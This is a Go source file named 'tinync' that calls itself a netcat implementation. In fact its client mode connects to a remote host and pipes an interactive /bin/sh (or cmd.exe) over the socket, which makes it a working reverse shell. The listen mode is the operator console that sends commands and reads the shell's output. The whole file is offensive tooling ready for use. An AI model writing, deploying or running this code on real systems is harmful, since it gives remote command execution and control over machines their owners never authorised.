// Go-netcat-implementation
package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
	"time"
)

const HELP_STRING="Usage: tinync -l -p [RPORT]\n       tinync -p [RPORT] [RHOST]\n"

func main() {
	// Setting up flags
	listen := flag.Bool("l", false, "Listen mode")
	RPORT := flag.Int("p", 0, "-p [PORT]")
	flag.Parse()
  RHOST := flag.Arg(0)

	// Usage
	if len(flag.Args()) < 1 && !(*listen) {
    fmt.Print(HELP_STRING)
		return
	}

  // Port must be specified when connecting as a client
  if *RPORT == 0 && !(*listen) {
    fmt.Println("Port must be specified with -p")
		fmt.Print(HELP_STRING)
    return
  }



	// Functionality
	if *listen {
    // Default port at listening 
    if *RPORT == 0 { 
     *RPORT = 8000
    }
		reader := bufio.NewReader(os.Stdin)
		// Setting up listener
		listener, err := net.Listen("tcp", ":"+strconv.Itoa(*RPORT))
		if err != nil {
			fmt.Println(err)
			return
		}
		fmt.Printf("Listening on port %d...\n", *RPORT)
		defer listener.Close()
		// Handle connections
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}
		handleConn_AsServer(conn, reader)

	} else {
		// Setting up connection
		address := RHOST + ":" + strconv.Itoa(*RPORT)
		conn, err := net.Dial("tcp", address)
		if err != nil {
			fmt.Println("Error connecting to the host")
      fmt.Println(RHOST)
      fmt.Println(*RPORT)
			return
		}
		// Handle connection
		fmt.Printf("Connected to %s:%d\n", RHOST, *RPORT)
		handleConn(conn)
	}
	// Error handling
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("Usage: tinync -l -p [RPORT]")
			fmt.Println("       tinync -p [RPORT] [RHOST]")
		}
	}()
} // main

/* Connection Handler (client) */
func handleConn(conn net.Conn) {
	defer conn.Close()

	// for linux
	cmd := exec.Command("/bin/sh", "-i")
	// for windows
	// cmd := exec.Command("cmd.exe")

	rp, wp := io.Pipe()

	cmd.Stdin = conn
	cmd.Stdout = wp
	cmd.Stderr = wp

	go io.Copy(conn, rp)

	if err := cmd.Run(); err != nil {
		fmt.Println(err)
		return
	}
}

func handleConn_AsServer(conn net.Conn, reader *bufio.Reader) {
	/* Connection Handler (server) */
	defer conn.Close()
	fmt.Printf("Connected to %s\n", conn.RemoteAddr().String())
	buf := make([]byte, 1024)
	for {
		// Read
		for {
			conn.SetReadDeadline(time.Now().Add(time.Second))
			n, err := conn.Read(buf)
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					break
				}
				fmt.Println(err)
			}
			fmt.Printf(string(buf[:n]))
		}

		// Write
		cmd, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
		}
		if cmd == "" {
			continue
		} else if cmd == "exit\n" {
			conn.Close()
			break
		}
		if _, err := conn.Write([]byte(cmd)); err != nil {
			fmt.Println("Error sending datagram: ", err)
		}
	}
}
